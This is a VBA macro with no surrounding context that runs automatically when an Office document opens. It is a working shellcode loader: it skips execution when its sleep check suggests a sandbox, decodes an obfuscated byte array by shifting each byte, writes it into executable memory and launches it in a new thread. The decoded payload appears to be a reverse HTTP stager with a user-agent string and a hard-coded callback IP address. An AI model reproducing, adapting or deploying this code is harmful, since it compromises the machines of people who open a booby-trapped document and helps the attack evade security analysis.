Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    'Dim res As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    
    If time < 2 Then
        Exit Function
    End If

    buf = Array(254, 234, 145, 2, 2, 2, 98, 51, 212, 139, 231, 102, 141, 84, 50, 141, 84, 14, 141, 84, 22, 51, 1, 141, 116, 42, 17, 185, 76, 40, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 89, 141, _
84, 18, 141, 68, 62, 3, 210, 141, 66, 122, 135, 194, 118, 78, 3, 210, 141, 90, 34, 3, 213, 82, 141, 74, 26, 135, 203, 118, 62, 75, 141, 54, 141, 51, 1, 3, 216, 51, 194, 174, 195, 209, 15, 3, 201, 58, 226, 119, 246, 5, _
127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _
106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 64, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 89, 107, 112, 102, 113, 121, 117, _
34, 80, 86, 34, 56, 48, 51, 61, 34, 86, 116, 107, 102, 103, 112, 118, 49, 57, 48, 50, 61, 34, 116, 120, 60, 51, 51, 48, 50, 43, 34, 110, 107, 109, 103, 34, 73, 103, 101, 109, 113, 2, 106, 60, 88, 123, 169, 1, 215, 85, _
85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 220, 2, 2, 2, 49, 67, 58, 69, 102, 101, 108, 79, 101, 82, 67, 86, 82, 81, 79, 54, 55, 116, 110, 108, 103, 108, 67, 80, 53, 113, 91, 69, 103, 77, 76, 82, 74, 110, 79, _
51, 56, 114, 54, 89, 55, 72, 118, 85, 47, 111, 81, 122, 102, 116, 101, 72, 50, 70, 120, 108, 124, 120, 113, 69, 112, 74, 103, 104, 84, 51, 57, 120, 75, 53, 107, 113, 111, 108, 2, 82, 106, 89, 139, 161, 200, 1, 215, 139, 200, _
85, 106, 2, 52, 234, 134, 85, 85, 85, 89, 85, 88, 106, 237, 87, 48, 61, 1, 215, 152, 108, 12, 97, 106, 130, 53, 2, 2, 139, 226, 108, 6, 82, 108, 33, 88, 106, 119, 72, 160, 136, 1, 215, 85, 85, 85, 85, 88, 106, 47, _
8, 26, 125, 1, 215, 135, 194, 119, 22, 106, 138, 21, 2, 2, 106, 70, 242, 55, 226, 1, 215, 81, 119, 207, 234, 76, 2, 2, 2, 108, 66, 106, 2, 18, 2, 2, 106, 2, 2, 66, 2, 85, 106, 90, 166, 85, 231, 1, 215, 149, _
85, 85, 139, 233, 89, 106, 2, 34, 2, 2, 85, 88, 106, 20, 152, 139, 228, 1, 215, 135, 194, 118, 209, 141, 9, 3, 197, 135, 194, 119, 231, 90, 197, 97, 234, 109, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, 54, 59, 48, _
56, 59, 2, 189, 226, 31, 44, 12, 106, 168, 151, 191, 159, 1, 215, 62, 8, 126, 12, 130, 253, 226, 119, 7, 189, 73, 21, 116, 113, 108, 2, 85, 1, 215)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
